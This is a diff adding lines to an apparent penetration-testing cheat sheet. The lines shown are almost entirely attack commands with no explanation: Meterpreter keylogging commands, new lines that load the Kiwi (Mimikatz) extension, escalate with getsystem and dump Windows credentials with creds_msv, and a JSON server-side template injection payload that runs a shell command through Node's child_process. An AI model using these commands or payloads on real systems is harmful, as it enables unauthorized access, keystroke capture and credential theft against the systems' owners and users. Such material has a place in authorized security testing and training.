@@ -211,6 +211,11 @@ screenshot
 keyscan_start
 keyscan_dump
 keyscan_stop
+load powershell
+powershell_execute "$PSVersionTable.PSVersion"
+load kiwi
+getsystem
+creds_msv
 
 JSON SSTI POST request (replace email by the right param)
 {"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"}
